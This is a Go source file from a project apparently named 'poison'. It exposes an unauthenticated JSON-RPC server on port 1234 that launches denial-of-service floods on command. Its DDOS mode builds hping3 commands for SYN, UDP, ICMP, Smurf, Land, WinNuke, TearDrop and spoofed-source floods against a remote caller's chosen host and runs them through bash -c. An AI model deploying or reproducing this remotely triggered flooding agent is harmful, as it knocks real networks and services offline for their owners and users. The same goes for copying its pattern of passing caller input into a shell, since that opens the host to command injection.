// Package service -----------------------------
// @file      : rpc.go
// @author    : fzf
// @time      : 2023/6/7 下午2:59
// -------------------------------------------
package service

import (
	"fmt"
	logger "github.com/sirupsen/logrus"
	"net"
	"net/rpc"
	"net/rpc/jsonrpc"
	"os"
	"os/exec"
	"poison/src/model"
	"poison/src/utils"
	"time"
)

type RPC struct {
	config *model.InterfaceModel
}

func (r *RPC) Execute(config *model.InterfaceModel) {
	listener, err := net.Listen("tcp", ":1234")
	if err != nil {
		logger.Fatalln(err)
	}
	_ = rpc.RegisterName("Flow", new(RPC))
	defer listener.Close()
	for {
		conn, _ := listener.Accept()
		go rpc.ServeCodec(jsonrpc.NewServerCodec(conn)) // 支持高并发
	}
}
func (r *RPC) method() error {
	logger.Infoln(r.config)
	switch r.config.APPMode {
	case model.SEND:
		if err := utils.Client.Execute(r.config); err != nil {
			return err
		}
	case model.DDOS:
		hping := Generate()
		commands := map[string]string{
			"TCP":      fmt.Sprintf("%s  -c 1000 -d 120 -S -p 10086 --flood %s", hping, r.config.DstHost),
			"UDP":      fmt.Sprintf("%s  %s -c 1000 --flood -2 -p 10086", hping, r.config.DstHost),
			"ICMP":     fmt.Sprintf("%s  %s -c 1000 --flood -1", hping, r.config.DstHost),
			"WinNuke":  fmt.Sprintf("%s  -d 120 -U %s -p 139", hping, r.config.DstHost),
			"Smurf":    fmt.Sprintf("%s  -1 %s --flood", hping, r.config.DstHost),
			"Land":     fmt.Sprintf("%s  -d 120 -S -a %s -p 10086 %s", hping, r.config.DstHost, r.config.DstHost),
			"TearDrop": fmt.Sprintf("%s  %s -2 -d 5000 --fragoff 1200 --frag --mtu 1000", hping, r.config.DstHost),
			"MAXICMP":  fmt.Sprintf("%s  %s -c 10000 -d 5000 --flood -1 --rand-source", hping, r.config.DstHost),
		}
		cmd := exec.Command("bash", "-c", commands[r.config.Mode])
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		// 启动协程执行命令
		go func() {
			cmd.Run()
		}()
		// 等待30秒
		waitTime := 30 * time.Second
		fmt.Printf("等待 %s 后关闭命令...\n", waitTime)
		time.Sleep(waitTime)
		// 关闭命令
		if err := cmd.Process.Kill(); err != nil {
			fmt.Println("命令关闭失败:", err)
		}
		fmt.Println("命令已关闭.")
	}
	return nil
}
func (r *RPC) Start(config *model.InterfaceModel, result *error) error {
	r.config = config
	if err := r.method(); err != nil {
		*result = err
		return err
	}
	return nil
}
